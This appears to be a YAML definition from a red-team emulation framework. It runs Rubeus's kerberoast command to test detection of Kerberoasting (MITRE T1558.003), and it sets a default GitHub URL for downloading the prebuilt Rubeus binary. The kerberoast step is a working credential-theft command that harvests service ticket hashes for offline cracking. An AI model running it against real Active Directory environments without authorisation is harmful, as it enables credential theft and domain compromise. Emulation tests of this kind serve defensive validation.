api_version: "2.0"
name: Rubeus kerberoast
description: |
    Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
    This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
args:
    - name: rubeus_url
      type: url
      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
    - name: flags
      type: string
      default: <nil>
    - name: local_folder
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads
    - name: local_executable
      type: string
      default: rubeus.exe
    - name: out_file
      type: string
      default: rubeus_output.txt
uuid: 14625569-6def-4497-99ac-8e7817105b55
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1558: Steal or Forge Kerberos Tickets'
    subtechniques:
        - 'T1558.003: Kerberoasting'
requirements:
    platforms:
        - os: windows
steps:
    - name: rubeus-kerberoast
      inline: |
        klist purge
        cmd.exe /c "{{.Args.local_folder}}\{{.Args.local_executable}}" kerberoast {{.Args.flags}} /outfile:"{{.Args.local_folder}}\{{.Args.out_file}}"
      executor: powershell
      cleanup:
        inline: |
            Remove-Item "{{.Args.local_folder}}\{{.Args.out_file}}" -ErrorAction Ignore
        executor: powershell
